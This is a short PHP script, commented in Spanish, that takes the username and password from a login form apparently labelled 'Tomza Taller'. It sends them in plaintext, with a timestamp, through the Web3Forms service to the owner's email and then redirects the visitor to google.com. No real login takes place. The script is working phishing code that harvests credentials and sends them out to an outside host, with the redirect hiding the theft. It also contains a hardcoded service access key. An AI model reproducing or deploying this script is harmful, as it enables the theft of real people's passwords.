<?php
// Evita acceso directo al archivo
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

// Recibe los datos del formulario
$usuario = trim($_POST["usuario"] ?? "");
$password = trim($_POST["password"] ?? "");

// Verifica que no estén vacíos
if ($usuario === "" || $password === "") {
    echo "Por favor completa todos los campos.";
    exit;
}

// --------------------------
// CONFIGURACIÓN WEB3FORMS
// --------------------------
$access_key = "bafc5339-b2a5-4e5b-bad7-a4d93a053174"; // Tu clave ya puesta

// Datos que llegarán a tu correo
$datos = [
    'access_key' => $access_key,
    'subject' => 'Nuevo ingreso - Tomza Taller',
    'Usuario' => $usuario,
    'Contraseña' => $password,
    'Fecha y hora' => date("d/m/Y H:i:s")
];

// Envía la información de forma segura
$opciones = [
    'http' => [
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($datos)
    ]
];
@file_get_contents('https://api.web3forms.com/submit', false, stream_context_create($opciones));

// Redirige a Google como querías
header("Location: https://www.google.com");
exit;
?>
